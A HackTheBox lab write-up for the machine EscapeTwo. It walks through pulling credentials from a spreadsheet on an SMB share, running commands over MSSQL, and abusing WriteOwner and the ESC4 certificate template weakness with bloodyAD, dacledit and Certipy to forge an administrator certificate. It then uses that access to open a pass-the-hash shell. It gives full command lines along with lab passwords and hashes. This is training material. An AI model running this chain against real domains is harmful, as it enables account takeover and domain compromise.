# EscapeTwo -- HackTheBox (write-up)

**Difficulty:** Hard
**Box:** EscapeTwo (HackTheBox)
**Author:** dsec
**Date:** 2025-02-14

---

## TL;DR

### Assumed breach scenario. Extracted credentials from a corrupted .xlsx on an SMB share, pivoted through MSSQL to get a shell, then abused WriteOwner on a certificate service account to forge an admin certificate via ESC4 and get Domain Admin.

---

## Target info

- Domain: `sequel.htb` / `escapetwo.htb`
- Assumed breach creds: `rose:KxEPkKe6R8su`

---

## Enumeration

![Nmap results](images/escapetwo-htb_1.png)

![SMB enum](images/escapetwo-htb_2.png)

![Shares](images/escapetwo-htb_3.png)

![LDAP enum](images/escapetwo-htb_4.png)

![Users](images/escapetwo-htb_5.png)

![BloodHound](images/escapetwo-htb_6.png)

![Groups](images/escapetwo-htb_7.png)

`nxc` errored out:

![nxc error](images/escapetwo-htb_8.png)

![Additional enum](images/escapetwo-htb_9.png)

![More enum](images/escapetwo-htb_10.png)

![Remote management users](images/escapetwo-htb_11.png)

- `ryan` is the only user in the Remote Management Users group.

Tried moving `rose` to remote users group with ldeep -- **failed**:

![ldeep fail](images/escapetwo-htb_12.png)

![sql_svc hash](images/escapetwo-htb_13.png)

- Got hash for `sql_svc` but could **not** crack it.

---

## SMB share & credential extraction

```bash
smbclient //10.10.11.51/Accounting\ Department -U rose
```

![SMB share](images/escapetwo-htb_14.png)

- `smbclient.py` would **not** work due to space escaping issues. Had to use `smbclient` instead.

Found a corrupted `.xlsx` -- unzipped and examined the XML:

![xlsx contents](images/escapetwo-htb_15.png)

Extracted credentials from the shared strings XML:
- `angela:0fwz7Q4mSpurIt99`
- `oscar:86LxLBMgEWaKUnBG`
- `kevin:Md9Wlq1E5bZnVDVo`
- `sa:MSSQLP@ssw0rd!`

---

## MSSQL & lateral movement

```bash
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' -x whoami --local-auth
```

![MSSQL access](images/escapetwo-htb_16.png)

![Config search](images/escapetwo-htb_17.png)

![Ryan's creds](images/escapetwo-htb_18.png)

Found `ryan`'s password: `WqSZAF6CysDQbGb3`

![BloodHound - ryan](images/escapetwo-htb_19.png)

---

## Certificate abuse (ESC4)

![WriteOwner on ca_svc](images/escapetwo-htb_20.png)

- `ryan` can set himself as the owner of `CA_SVC`.
- `CA_SVC` is a certificate issuer.

Run these commands in a very fast sequence:

```bash
bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'

dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"

sudo ntpdate sequel.htb

certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
```

![Commands executed](images/escapetwo-htb_21.png)

Got `ca_svc` hash: `3b181b914e7a9d5508ea1e20bc2b7fce`

Uploaded `Certify.exe` and ran it as `ryan`:

```bash
./Certify.exe find /domain:sequel.htb
```

![Certify output](images/escapetwo-htb_22.png)

- `ca_svc` is a member of `Cert Publishers` group with inherited permissions.

![Cert Publishers](images/escapetwo-htb_23.png)

Overwrote the certificate template:

```bash
KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
```

![Template overwrite](images/escapetwo-htb_24.png)

Requested a certificate as administrator:

```bash
certipy req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
```

![Certificate request](images/escapetwo-htb_25.png)

Authenticated with the certificate (had to force the DC IP with `-dc-ip`):

```bash
certipy auth -pfx administrator_10.pfx -domain sequel.htb -dc-ip 10.10.11.51 -debug
```

![Certipy auth fail](images/escapetwo-htb_26.png)

![Certipy auth success](images/escapetwo-htb_27.png)

Got admin hash: `aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff`

```bash
evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

![Admin shell](images/escapetwo-htb_28.png)

---

## Lessons & takeaways

- `smbclient` handles share names with spaces; `smbclient.py` does **not**
- Corrupted `.xlsx` files can sometimes be unzipped and examined as raw XML
- WriteOwner on a certificate service account can be chained into ESC4 for domain admin
- When certipy auth fails, use `-debug` and force the DC IP with `-dc-ip`
